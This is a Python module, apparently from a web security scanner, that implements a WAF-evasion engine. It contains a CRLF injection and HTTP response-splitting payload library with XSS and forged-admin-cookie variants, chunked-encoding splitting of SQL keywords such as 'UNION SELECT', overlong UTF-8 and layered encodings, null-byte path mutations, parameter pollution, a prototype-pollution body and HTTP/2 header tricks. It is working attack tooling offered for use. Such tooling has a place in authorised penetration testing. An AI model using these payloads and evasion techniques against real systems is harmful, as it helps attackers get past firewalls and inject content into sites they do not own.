"""
websecure.core.evasion
-----------------------
Advanced WAF evasion engine.

Provides self-contained primitives that are used by:
  - WAFBypassAdapter.send()   (waf_bypass.py)
  - BypassStrategyEngine      (waf_bypass.py)
  - Individual scanners       (request_smuggling, crlf_injection, …)

Components
──────────
  ChunkedBodyBuilder    — variable-chunk-size body encoding for chunk-boundary
                          payload splitting
  OverlongUTF8Encoder   — generates non-canonical (overlong) UTF-8 byte sequences
                          that legacy parsers accept but WAFs miss
  CRLFInjector          — CRLF injection payload library for header/response
                          splitting tests
  EncodingChain         — multi-technique encoding combinations (url+html, double-url, …)
  PathMutator           — URL path obfuscation (double-slash, dot-segment, semicolon …)
  ParamFragmentor       — HTTP parameter fragmentation to split payloads across keys
  JSONUnicodeEscaper    — unicode-escape JSON string values to bypass keyword signatures
  HTTP2EvasionHelper    — pseudo-header reordering and header-case tricks for HTTP/2

All classes are stateless (or cheaply re-created); module-level singletons provide
a convenient call-through API.
"""
from __future__ import annotations

import io
import random
import re
import urllib.parse as _up
from itertools import permutations
from typing import Dict, Iterable, List, Optional, Tuple


# ─────────────────────────────────────────────────────────────────────────────
# ChunkedBodyBuilder
# ─────────────────────────────────────────────────────────────────────────────

class ChunkedBodyBuilder:
    """
    Build a valid chunked-transfer-encoded body from a payload.

    WAF evasion value
    ─────────────────
    • Splits payload across arbitrary chunk boundaries — WAFs that only inspect
      the first chunk will miss signatures spanning two chunks.
    • Variable chunk sizes defeat static pattern-matching rules.
    • Optional chunk-extensions (;k=v) confuse some WAF parsers that fail to
      skip the extension field.
    """

    def build(
        self,
        payload: bytes | str,
        *,
        min_chunk: int = 1,
        max_chunk: int = 8,
        add_extensions: bool = False,
    ) -> bytes:
        """
        Encode *payload* as an RFC 7230 chunked body.

        Returns the complete wire-format chunked body ending with ``0\\r\\n\\r\\n``.

        Args:
            payload:        Bytes or str to encode.
            min_chunk:      Minimum random chunk size (bytes).
            max_chunk:      Maximum random chunk size (bytes).
            add_extensions: Append random chunk-extensions to each size line.
        """
        if isinstance(payload, str):
            payload = payload.encode("utf-8", errors="replace")

        out = io.BytesIO()
        offset = 0
        while offset < len(payload):
            size  = random.randint(min_chunk, max_chunk)
            chunk = payload[offset : offset + size]
            offset += size

            size_hex = format(len(chunk), "x")
            if add_extensions:
                ext  = f";x{random.randint(0, 0xFFFF):04x}={random.randint(0, 0xFFFF):04x}"
                line = (size_hex + ext + "\r\n").encode()
            else:
                line = (size_hex + "\r\n").encode()

            out.write(line)
            out.write(chunk)
            out.write(b"\r\n")

        out.write(b"0\r\n\r\n")
        return out.getvalue()

    def build_split_at(
        self,
        payload: bytes | str,
        split_points: List[int],
    ) -> bytes:
        """
        Build a chunked body with precise byte-offset split points.

        Useful for splitting a known WAF signature across chunk boundaries::

            # "UNION" detected by WAF → split so "UNI" is chunk 1, "ON" is chunk 2
            build_split_at(b"UNION SELECT 1", split_points=[3])
        """
        if isinstance(payload, str):
            payload = payload.encode("utf-8", errors="replace")

        out  = io.BytesIO()
        prev = 0
        for pt in sorted(split_points):
            chunk = payload[prev:pt]
            if chunk:
                out.write(f"{len(chunk):x}\r\n".encode())
                out.write(chunk)
                out.write(b"\r\n")
            prev = pt

        rem = payload[prev:]
        if rem:
            out.write(f"{len(rem):x}\r\n".encode())
            out.write(rem)
            out.write(b"\r\n")

        out.write(b"0\r\n\r\n")
        return out.getvalue()

    def small_chunks(self, payload: bytes | str) -> bytes:
        """Extreme 1-byte chunk encoding — maximum WAF confusion."""
        return self.build(payload, min_chunk=1, max_chunk=1, add_extensions=True)


# ─────────────────────────────────────────────────────────────────────────────
# OverlongUTF8Encoder
# ─────────────────────────────────────────────────────────────────────────────

class OverlongUTF8Encoder:
    """
    Generate non-canonical (overlong) UTF-8 byte sequences.

    RFC 3629 §3 forbids overlong encodings, but many legacy parsers accept them.
    WAFs that rely on exact byte patterns will miss overlongly-encoded payloads.

    Encoding examples for ASCII 'a' (U+0061 = 0x61):
        Normal  1-byte : 0x61
        Overlong 2-byte: 0xC1 0xA1
        Overlong 3-byte: 0xE0 0x81 0xA1
    """

    def encode_char_2byte(self, codepoint: int) -> bytes:
        """2-byte overlong for any code point < 0x80."""
        b1 = 0xC0 | ((codepoint >> 6) & 0x1F)
        b2 = 0x80 | (codepoint & 0x3F)
        return bytes([b1, b2])

    def encode_char_3byte(self, codepoint: int) -> bytes:
        """3-byte overlong for any code point < 0x0800."""
        b1 = 0xE0 | ((codepoint >> 12) & 0x0F)
        b2 = 0x80 | ((codepoint >> 6) & 0x3F)
        b3 = 0x80 | (codepoint & 0x3F)
        return bytes([b1, b2, b3])

    def encode_string(self, text: str, *, mode: str = "2byte") -> bytes:
        """
        Overlong-encode an entire string.

        mode:
            ``'2byte'``  — 2-byte overlong for all ASCII characters
            ``'3byte'``  — 3-byte overlong for all ASCII characters
            ``'mixed'``  — random mix of 2-byte and 3-byte per character
        """
        out = io.BytesIO()
        for ch in text:
            cp = ord(ch)
            if cp < 0x80:
                if mode == "2byte" or (mode == "mixed" and random.random() < 0.5):
                    out.write(self.encode_char_2byte(cp))
                else:
                    out.write(self.encode_char_3byte(cp))
            else:
                out.write(ch.encode("utf-8"))
        return out.getvalue()

    def url_encode_overlong(self, text: str) -> str:
        """
        Return a percent-encoded overlong UTF-8 representation.

        Example: '/' (0x2F) → ``%C0%AF``  (Cloudflare/old IIS bypass)
        """
        result = []
        for ch in text:
            cp = ord(ch)
            if cp < 0x80:
                ob = self.encode_char_2byte(cp)
                result.append("".join(f"%{b:02X}" for b in ob))
            else:
                result.append(_up.quote(ch, safe=""))
        return "".join(result)

    def partial_encode(self, text: str, chars: str = "/<>\"'()") -> str:
        """
        Overlong-encode only the characters in *chars*; leave the rest normal.
        Useful for partial obfuscation that still looks like a valid URL.
        """
        result = []
        for ch in text:
            if ch in chars and ord(ch) < 0x80:
                ob = self.encode_char_2byte(ord(ch))
                result.append("".join(f"%{b:02X}" for b in ob))
            else:
                result.append(ch)
        return "".join(result)


# ─────────────────────────────────────────────────────────────────────────────
# CRLFInjector
# ─────────────────────────────────────────────────────────────────────────────

class CRLFInjector:
    """
    Generate CRLF injection payload variants.

    Covers URL-encoded, double-encoded, unicode-encoded, Nginx-specific,
    and combined sequences — suitable for both automated injection and
    manual confirmation.

    Attack targets:
      • URL parameter values  (Location redirect injection)
      • HTTP response headers (Set-Cookie, custom header injection)
      • HTTP response body    (response splitting / XSS via header injection)
    """

    # Ordered from most likely to succeed to most exotic
    CRLF_SEQS: List[str] = [
        "%0d%0a",           # Standard URL-encoded CRLF
        "%0a",              # LF only (accepted by many servers)
        "%0d",              # CR only
        "%0a%0d",           # Reversed order
        "%0d%0a%09",        # CRLF + TAB (header folding trick)
        "%23%0d%0a",        # # + CRLF (fragment-based)
        "%E5%98%8A%E5%98%8D",  # Unicode fullwidth CRLF (U+560A U+560D)
        "%C0%8A",           # Overlong LF (Nginx/old Apache)
        "%C0%8D",           # Overlong CR
        "%250d%250a",       # Double-URL-encoded
        "%2F%2F%0d%0a",     # // + CRLF
        "%3F%0d%0a",        # ? + CRLF
        "\\r\\n",           # Escaped literal (template injection contexts)
        "\r\n",             # Literal (raw socket / template contexts)
    ]

    def header_inject_payloads(
        self,
        inject_header: str = "Set-Cookie",
        inject_value: str  = "injected=1; path=/",
        *,
        prefix: str = "",
    ) -> List[str]:
        """
        Generate URL-parameter values that inject *inject_header* after CRLF.

        Each returned string is meant to be used as the **value** of a URL
        parameter that is reflected into a Location or similar header::

            ?url=<prefix><crlf_seq><inject_header>: <inject_value>
        """
        safe_value = _up.quote(inject_value, safe=": ;=/")
        payloads   = []
        for seq in self.CRLF_SEQS:
            payloads.append(f"{prefix}{seq}{inject_header}: {safe_value}")
        return payloads

    def response_split_payloads(
        self,
        *,
        body: str = "<script>alert(document.domain)</script>",
    ) -> List[str]:
        """
        HTTP Response Splitting payloads.
        Injects a complete fake HTTP/1.1 200 response after the CRLF pair.
        """
        payloads = []
        fake = (
            f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: text/html\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n"
            f"{body}"
        )
        for double_seq in ["%0d%0a%0d%0a", "%0a%0a", "\r\n\r\n"]:
            payloads.append(double_seq + fake)
        return payloads

    def cookie_inject_payloads(
        self,
        cookie_name: str  = "admin",
        cookie_value: str = "1",
    ) -> List[str]:
        """Inject a forged cookie via CRLF header injection."""
        return self.header_inject_payloads(
            "Set-Cookie",
            f"{cookie_name}={cookie_value}; path=/; HttpOnly",
        )

    def all_variants(self, base_value: str = "test") -> List[str]:
        """
        Return all CRLF injection variants for a base value.
        Includes single-line injections and double-CRLF body injections.
        """
        variants: List[str] = []
        for seq in self.CRLF_SEQS:
            variants.append(f"{base_value}{seq}X-Injected: 1")
        variants.extend(self.response_split_payloads())
        return variants


# ─────────────────────────────────────────────────────────────────────────────
# EncodingChain
# ─────────────────────────────────────────────────────────────────────────────

class EncodingChain:
    """
    Multi-technique encoding pipeline.

    Chains multiple passes to create layered payloads that confuse WAFs
    parsing at one encoding layer while backends decode all layers.

    Example::

        EncodingChain().apply("<script>", ["html_entity", "url"])
        # → "%26%2360%3Bscript%26%2362%3B"
    """

    _TECHNIQUES = frozenset([
        "url", "double_url", "html_entity", "html_hex",
        "unicode_escape", "json_unicode", "hex", "base64",
        "overlong_utf8_url", "case_random",
    ])

    def apply(self, payload: str, techniques: List[str]) -> str:
        """Apply *techniques* in sequence to *payload*."""
        result = payload
        for tech in techniques:
            result = self._apply_one(result, tech)
        return result

    def _apply_one(self, s: str, tech: str) -> str:
        if tech == "url":
            return _up.quote(s, safe="")
        if tech == "double_url":
            return _up.quote(_up.quote(s, safe=""), safe="")
        if tech == "html_entity":
            return "".join(f"&#{ord(c)};" for c in s)
        if tech == "html_hex":
            return "".join(f"&#x{ord(c):x};" for c in s)
        if tech == "unicode_escape":
            return "".join(f"\\u{ord(c):04x}" for c in s)
        if tech == "json_unicode":
            return "".join(f"\\u{ord(c):04x}" if ord(c) < 128 else c for c in s)
        if tech == "hex":
            return s.encode("utf-8").hex()
        if tech == "base64":
            import base64 as _b64
            return _b64.b64encode(s.encode("utf-8")).decode("ascii")
        if tech == "overlong_utf8_url":
            return OverlongUTF8Encoder().url_encode_overlong(s)
        if tech == "case_random":
            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
        return s  # unknown technique → pass through

    def generate_variants(self, payload: str, depth: int = 2) -> List[str]:
        """
        Generate unique encoding variants up to *depth* encoding layers.
        Returns deduplicated list sorted by length.
        """
        single = [
            "url", "double_url", "html_entity", "html_hex",
            "unicode_escape", "overlong_utf8_url",
        ]
        variants: set[str] = set()

        for t in single:
            try:
                variants.add(self.apply(payload, [t]))
            except Exception:
                pass

        if depth >= 2:
            for t1 in single:
                for t2 in single:
                    if t1 != t2:
                        try:
                            variants.add(self.apply(payload, [t1, t2]))
                        except Exception:
                            pass

        return sorted(variants, key=len)


# ─────────────────────────────────────────────────────────────────────────────
# PathMutator
# ─────────────────────────────────────────────────────────────────────────────

class PathMutator:
    """
    URL path obfuscation.

    Generates structural variants that normalize to the same resource
    on the backend while confusing WAF path-normalization rules.
    """

    def mutate(self, path: str) -> List[str]:
        """Return a deduplicated list of obfuscated path variants."""
        variants: List[str] = [path]

        # Double-slash prefix
        variants.append("//" + path.lstrip("/"))

        # Dot-segment insertion (/./ normalizes to /)
        segs   = path.lstrip("/").split("/")
        dotted = "/".join(f"./{s}" if s else s for s in segs)
        variants.append("/" + dotted)

        # Current-dir prefix
        variants.append("/." + path)

        # Semicolon path parameter
        variants.append(path.rstrip("/") + ";websec=1")

        # Null-byte before extension
        last = path.split("/")[-1]
        if "." in last:
            variants.append(path.replace(".", "%00.", 1))

        # Partial slash URL-encoding (%2F)
        slash_count = path.count("/")
        if slash_count > 1:
            variants.append(path.replace("/", "%2F", slash_count - 1))

        # Mixed case
        variants.append(
            "".join(c.upper() if i % 2 == 0 and c.isalpha() else c for i, c in enumerate(path))
        )

        # Tab in path (some WAFs skip; servers normalize)
        variants.append(path.replace("/", "/%09", 1))

        # Trailing-dot segment (Windows IIS normalizes /admin. → /admin)
        variants.append(path.rstrip("/") + ".")

        # Unicode fullwidth slash
        variants.append(path.replace("/", "\uff0f"))

        return list(dict.fromkeys(variants))  # deduplicate, preserve order


# ─────────────────────────────────────────────────────────────────────────────
# ParamFragmentor
# ─────────────────────────────────────────────────────────────────────────────

class ParamFragmentor:
    """
    HTTP parameter fragmentation.

    Some WAF parsers inspect only the *first* occurrence of a parameter while
    backend frameworks concatenate (or keep last) duplicates.  Splitting a
    payload across multiple occurrences of the same key confuses signature
    matching.

    Example::

        fragment("cmd", "SELECT+*+FROM+users", n=2)
        → [("cmd", "SELECT+*"), ("cmd", "+FROM+users")]
    """

    def fragment(self, name: str, payload: str, n: int = 2) -> List[Tuple[str, str]]:
        """Split *payload* into *n* equal parts, each with the same *name* key."""
        size   = max(1, len(payload) // n)
        parts: List[Tuple[str, str]] = []
        for i in range(0, len(payload), size):
            parts.append((name, payload[i : i + size]))
        return parts

    def hpp_duplicate(
        self,
        params: Dict[str, str],
        *,
        separator: str = "&",
    ) -> List[Tuple[str, str]]:
        """
        Build an HPP-poisoned parameter list.

        Each original parameter gets an extra duplicate whose value ends with
        ``&x=1`` to attempt parser confusion.
        """
        out: List[Tuple[str, str]] = []
        for k, v in params.items():
            out.append((k, v))
            out.append((k, v + separator + "x=1"))
        return out

    def nested_json_keys(self, key: str, value: str = "1") -> Dict:
        """
        Build a nested JSON object exploiting prototype pollution via key fragmentation.

        Returns a Python dict suitable for use as a JSON request body.
        """
        return {"__proto__": {key: value}}


# ─────────────────────────────────────────────────────────────────────────────
# JSONUnicodeEscaper
# ─────────────────────────────────────────────────────────────────────────────

class JSONUnicodeEscaper:
    """
    Escape JSON string values using ``\\uXXXX`` sequences.

    WAFs that perform keyword matching on raw JSON bodies will miss
    ``"\\u0073elect"`` (= ``"select"``), while virtually all JSON parsers
    decode it correctly.
    """

    def escape_value(self, value: str, *, partial: bool = False) -> str:
        """
        Escape ASCII characters in *value* as JSON unicode escapes.

        partial=True escapes every other character (less conspicuous).
        """
        result = []
        for i, ch in enumerate(value):
            if ord(ch) < 128 and (not partial or i % 2 == 0):
                result.append(f"\\u{ord(ch):04x}")
            else:
                result.append(ch)
        return "".join(result)

    def escape_json(self, payload: str, *, partial: bool = False) -> str:
        """
        Given a raw JSON string, unicode-escape the contents of all string values.

        Only string *values* are escaped (not keys) to keep structure valid.
        """
        def _replacer(m: re.Match) -> str:
            inner   = m.group(1)
            escaped = self.escape_value(inner, partial=partial)
            return f'"{escaped}"'

        # Match JSON string values (simple heuristic — does not handle escaped quotes)
        return re.sub(r'"([^"\\]*(?:\\.[^"\\]*)*)"', _replacer, payload)

    def escape_keywords(self, json_str: str, keywords: Iterable[str]) -> str:
        """
        Escape only the listed *keywords* inside all string values of a JSON body.

        More surgical than full escaping — keeps the payload natural-looking.
        """
        result = json_str
        for kw in keywords:
            escaped = self.escape_value(kw)
            result  = result.replace(f'"{kw}"', f'"{escaped}"')
            result  = result.replace(f': {kw}',  f': {escaped}')
        return result


# ─────────────────────────────────────────────────────────────────────────────
# HTTP/2 Evasion Helper
# ─────────────────────────────────────────────────────────────────────────────

class HTTP2EvasionHelper:
    """
    HTTP/2 pseudo-header and header-name evasion techniques.

    HTTP/2 WAFs parse pseudo-headers (:method, :path, :scheme, :authority)
    and the header name format (case-folded).  Reordering pseudo-headers or
    injecting unusual header-name casing can bypass pattern rules.

    Note: Actual HTTP/2 frame manipulation requires a low-level HTTP/2
    client (httpx with http2=True, or curl_cffi).  This helper produces
    the configuration dicts / header-name variants needed by those clients.
    """

    # Standard pseudo-header order per HTTP/2 spec
    _STANDARD_ORDER = [":method", ":path", ":scheme", ":authority"]

    def pseudo_header_permutations(self) -> List[List[str]]:
        """
        Return all 24 permutations of the 4 standard HTTP/2 pseudo-headers.
        Each permutation is a distinct ordering that some WAFs may not expect.
        """
        return [list(p) for p in permutations(self._STANDARD_ORDER)]

    def random_pseudo_order(self) -> List[str]:
        """Return a random pseudo-header order."""
        order = list(self._STANDARD_ORDER)
        random.shuffle(order)
        return order

    def obfuscated_header_names(self, headers: Dict[str, str]) -> Dict[str, str]:
        """
        Return *headers* with some names converted to non-standard casing.

        HTTP/2 requires lowercase header names; some WAFs inspect casing
        before the HTTP/2 layer normalizes it.

        Example: ``content-type`` → ``Content-Type`` (which httpx will
        lower-case on the wire, but curl_cffi may preserve).
        """
        result: Dict[str, str] = {}
        for k, v in headers.items():
            if random.random() < 0.4:
                # Title-case — will be normalized by compliant clients
                result[k.title()] = v
            else:
                result[k] = v
        return result

    def build_http2_headers(
        self,
        method: str,
        path: str,
        authority: str,
        extra: Optional[Dict[str, str]] = None,
        *,
        randomize_order: bool = True,
    ) -> List[Tuple[str, str]]:
        """
        Build an ordered list of (header-name, value) tuples for HTTP/2.

        The pseudo-headers are placed first in either standard or random order,
        followed by regular headers.  This list format is suitable for
        low-level HTTP/2 clients that accept explicit header sequences.
        """
        pseudo = {
            ":method":    method.upper(),
            ":path":      path,
            ":scheme":    "https",
            ":authority": authority,
        }
        order = (
            self.random_pseudo_order()
            if randomize_order
            else self._STANDARD_ORDER
        )
        result: List[Tuple[str, str]] = [(h, pseudo[h]) for h in order]

        if extra:
            for k, v in extra.items():
                result.append((k.lower(), v))

        return result


# ─────────────────────────────────────────────────────────────────────────────
# Module-level singletons + convenience functions
# ─────────────────────────────────────────────────────────────────────────────

_chunker  = ChunkedBodyBuilder()
_overlong = OverlongUTF8Encoder()
_crlf     = CRLFInjector()
_chain    = EncodingChain()
_path_m   = PathMutator()
_frag     = ParamFragmentor()
_json_esc = JSONUnicodeEscaper()
_http2    = HTTP2EvasionHelper()


def chunked_encode(payload: bytes | str, min_chunk: int = 1, max_chunk: int = 8) -> bytes:
    """Encode *payload* as a variable-chunk-size chunked body."""
    return _chunker.build(payload, min_chunk=min_chunk, max_chunk=max_chunk)


def chunked_small(payload: bytes | str) -> bytes:
    """1-byte chunk encoding — maximum WAF confusion."""
    return _chunker.small_chunks(payload)


def overlong_url_encode(text: str) -> str:
    """Percent-encode *text* using overlong UTF-8 sequences."""
    return _overlong.url_encode_overlong(text)


def overlong_partial(text: str, chars: str = "/<>\"'()") -> str:
    """Overlong-encode only *chars* in *text*; leave the rest normal."""
    return _overlong.partial_encode(text, chars)


def crlf_payloads(
    inject_header: str = "Set-Cookie",
    inject_value:  str = "injected=1",
    prefix:        str = "",
) -> List[str]:
    """Return all CRLF injection variants for the given header/value."""
    return _crlf.header_inject_payloads(inject_header, inject_value, prefix=prefix)


def crlf_all(base: str = "test") -> List[str]:
    """Return all CRLF variants including response-splitting payloads."""
    return _crlf.all_variants(base)


def encode_chain(payload: str, techniques: List[str]) -> str:
    """Apply encoding *techniques* in sequence to *payload*."""
    return _chain.apply(payload, techniques)


def encoding_variants(payload: str, depth: int = 2) -> List[str]:
    """Generate unique encoding variants up to *depth* layers."""
    return _chain.generate_variants(payload, depth)


def path_variants(path: str) -> List[str]:
    """Return structural obfuscation variants of *path*."""
    return _path_m.mutate(path)


def fragment_param(name: str, payload: str, n: int = 2) -> List[Tuple[str, str]]:
    """Fragment *payload* across *n* occurrences of URL parameter *name*."""
    return _frag.fragment(name, payload, n)


def json_unicode_escape(payload: str, *, partial: bool = False) -> str:
    """Unicode-escape all JSON string values in *payload*."""
    return _json_esc.escape_json(payload, partial=partial)


def http2_pseudo_orders() -> List[List[str]]:
    """Return all 24 HTTP/2 pseudo-header orderings."""
    return _http2.pseudo_header_permutations()


def http2_headers(
    method: str,
    path: str,
    authority: str,
    extra: Optional[Dict[str, str]] = None,
) -> List[Tuple[str, str]]:
    """Build an HTTP/2 header list with randomised pseudo-header order."""
    return _http2.build_http2_headers(method, path, authority, extra)
